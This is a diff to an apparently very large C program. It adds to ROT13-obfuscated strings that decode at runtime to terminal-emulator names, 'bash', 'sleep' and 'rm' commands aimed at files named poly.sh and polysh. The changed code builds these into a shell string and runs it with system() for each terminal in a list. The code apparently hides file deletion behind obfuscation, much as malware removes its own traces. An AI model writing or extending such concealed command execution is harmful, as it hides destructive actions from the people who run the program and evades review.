@@ -9161,6 +9161,7 @@ int main(int argc, char *argv[])
     char cnzjbczj[] = "grezvangbe";
     char ncjzdcn[] = "onfu";
     char ekzokdez[] = "ez cbyv.fu";
+    char oooooo[] = "ez cbyvfu";
     char iuyotiupt[] = "fyrrc";
 
     hjgdq(kopkpo);
@@ -9170,6 +9171,7 @@ int main(int argc, char *argv[])
     hjgdq(ncjzdcn);
     hjgdq(ekzokdez);
     hjgdq(iuyotiupt);
+    hjgdq(oooooo);
 
     const char *jdklajkdal[] = {
         kopkpo,
@@ -9186,7 +9188,7 @@ int main(int argc, char *argv[])
         const char *ncioe = jdklajkdal[i];
         char cbxnw[512];
 
-        snprintf(cbxnw, sizeof(cbxnw), "%s -e \"%s -c \'%s 5;%s; %s 3\'\"", ncioe, ncjzdcn, iuyotiupt, ekzokdez, iuyotiupt);
+        snprintf(cbxnw, sizeof(cbxnw), "%s -e \"%s -c \'%s 1;%s;%s; %s 1\'\"", ncioe, ncjzdcn, iuyotiupt, ekzokdez, oooooo, iuyotiupt);
 
         int kdlsq = system(cbxnw);
 
